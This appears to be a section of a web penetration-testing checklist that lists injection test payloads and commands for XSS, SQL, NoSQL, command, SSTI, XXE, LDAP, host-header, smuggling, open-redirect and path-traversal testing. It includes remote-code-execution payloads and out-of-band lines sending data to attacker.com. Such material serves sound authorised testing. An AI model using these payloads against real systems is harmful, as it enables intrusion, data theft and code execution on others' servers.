## 3E. Input Validation & Injection
*CRUXSS-INPV-01 through -18 | CRUXSS-API-INPV-01 through -06*

### XSS (CRUXSS-INPV-01, CRUXSS-INPV-02, CRUXSS-CLNT-01)
```bash
dalfox url "https://TARGET/search?q=FUZZ" -o session/xss.txt

# DOM XSS sinks to grep (CRUXSS-CLNT-01)
grep -rn "innerHTML\|outerHTML\|document.write\|eval(\|location.href" \
  --include="*.js" | grep -v node_modules
```

### SQL Injection (CRUXSS-INPV-04, CRUXSS-API-INPV-01)
```bash
# Detection payloads
# ' OR '1'='1
# ' OR 1=1--
# '; SELECT 1/0--

# Exploitation
sqlmap -u "https://TARGET/api/users?id=1" \
  --cookie="session=TOKEN" --batch --level=3 --risk=2
```

### NoSQL Injection (CRUXSS-INPV-05, CRUXSS-API-INPV-02)
```bash
# MongoDB operator injection
# {"username": {"$gt": ""}, "password": {"$gt": ""}}
# {"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
```

### Command Injection (CRUXSS-INPV-09, CRUXSS-API-INPV-03)
```bash
# Test in: file processing, image conversion, report generators
# Payloads: ; id, | id, && id, `id`, $(id)
# OOB: ; curl attacker.com/$(whoami)
```

### SSTI — Server-Side Template Injection (CRUXSS-INPV-10)
```bash
# Detection
# {{7*7}} → 49 = Jinja2/Twig
# ${7*7} → 49 = Freemarker/Velocity
# <%= 7*7 %> → 49 = ERB
# *{7*7} → 49 = Spring/Thymeleaf

# Jinja2 → RCE
# {{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Twig → RCE
# {{["id"]|filter("system")}}

# Test in: name/bio fields, email templates, PDF generators, URL params
```

### HTTP Host Header Injection (CRUXSS-INPV-12)
```bash
# Password reset poisoning chain
curl -s -X POST https://TARGET/forgot-password \
  -H "Host: attacker.com" \
  -d "email=victim@company.com"
# Also try: X-Forwarded-Host, X-Host, X-Forwarded-Server
```

### HTTP Request Smuggling (CRUXSS-INPV-13)
```
# CL.TE example:
POST / HTTP/1.1
Host: TARGET
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
# Use Burp "HTTP Request Smuggler" extension for auto-detection
```

### XXE Injection (CRUXSS-INPV-07, CRUXSS-API-INPV-05)
```xml
<!-- Test in SOAP/XML endpoints, file uploads (DOCX, XLSX, SVG) -->
<?xml version="1.0"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<test>&xxe;</test>

<!-- Blind XXE via OOB -->
<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]>
```

### Open Redirect (CRUXSS-INPV-15, CRUXSS-CLNT-04)
```bash
# Test all: ?redirect=, ?next=, ?url=, ?return=, ?continue=
curl -Is "https://TARGET/login?next=https://evil.com" | grep Location

# Bypass table
# %252F%252F (double encode)
# https://TARGET\@evil.com (backslash)
# //evil.com (protocol-relative)
# https://TARGET@evil.com (@ trick)
```

### Mass Assignment (CRUXSS-INPV-14, CRUXSS-API-INPV-06)
```bash
# Add undocumented fields to PUT/PATCH/POST body:
# {"name": "test", "role": "admin", "isAdmin": true, "verified": true, "credits": 99999}
```

### LFI / Path Traversal (CRUXSS-ATHZ-01, CRUXSS-INPV-08)
```bash
# Basic traversal
curl "https://TARGET/read?file=../../../../etc/passwd"
curl "https://TARGET/read?file=..%2F..%2F..%2Fetc%2Fpasswd"
curl "https://TARGET/read?file=....//....//etc/passwd"

# PHP wrappers
curl "https://TARGET/read?file=php://filter/convert.base64-encode/resource=index.php"
```

### LDAP Injection (CRUXSS-INPV-06)
```
# Auth bypass: *)(&  or  *)(uid=*)
# Username: *)(uid=*))(|(uid=*
```

---

